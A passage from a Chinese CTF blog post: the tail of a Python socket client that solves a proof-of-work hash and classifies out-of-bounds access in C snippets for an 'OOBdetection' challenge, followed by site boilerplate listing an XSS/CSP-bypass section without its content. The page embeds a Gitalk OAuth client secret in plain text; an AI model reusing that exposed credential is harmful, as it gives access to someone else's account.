class="comment"># 如果哈希值匹配，则打印 XXX 值并退出循环</span></span><br><span class="line">    <span class="keyword">if</span> hash_hex == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found XXX: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(xxx_hex))</span><br><span class="line">        code = xxx_hex</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.sendall(code.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收来自服务器的数据（设定接收数据的最大字节数为1024）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;TIMETIMETIME:::::&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">input</span> = data.decode() <span class="comment">#Your answer (safeb/unknown):</span></span><br><span class="line">        input_code = prfint(<span class="built_in">input</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        </span><br><span class="line">        boo = ifboo(input_code.replace(<span class="string">&#x27;[ &#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27; ]&#x27;</span>,<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span>(boo==<span class="string">&#x27;boo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;noboo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;safe&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;safe\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;unknown&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;unknown\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        <span class="comment"># 发送用户输入的数据到服务器</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>网上都是转成lark语法，我是转成了python语法，然后重载了列表，让他如果index&lt;0了，就触发异常，满足c语言的语法，然后根据不同的异常信息去判断结果</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/misc/" rel="tag"># misc</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/" rel="prev" title="CopyOnWriteArrayList解析">
+      <i class="fa fa-chevron-left"></i> CopyOnWriteArrayList解析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/06/%E5%89%8D%E7%AB%AFctf/" rel="next" title="前端ctf(持续更新)">
+      前端ctf(持续更新) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezBean"><span class="nav-number">1.</span> <span class="nav-text">ezBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#obsidian"><span class="nav-number">2.</span> <span class="nav-text">obsidian</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crlf%E7%BB%95%E8%BF%87csp%E5%8A%A0%E6%B3%A8%E5%85%A5xss"><span class="nav-number">2.1.</span> <span class="nav-text">crlf绕过csp加注入xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OOBdetection"><span class="nav-number">3.</span> <span class="nav-text">OOBdetection</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kaikaix"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">kaikaix</p>
+  <div class="site-description" itemprop="description">小白</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kaikaix</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'e015cfd8a7113f83449a',
+      clientSecret: 'ead135fac6fb19fb1953358c28ee9b0dc1625f9a',
+      repo        : 'kaikaix.github.io',
+      owner       : 'kaikaix',
+      admin       : ['kaikaix'],
+      id          : 'd504c2a9f39f3b746becec58eace012c',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
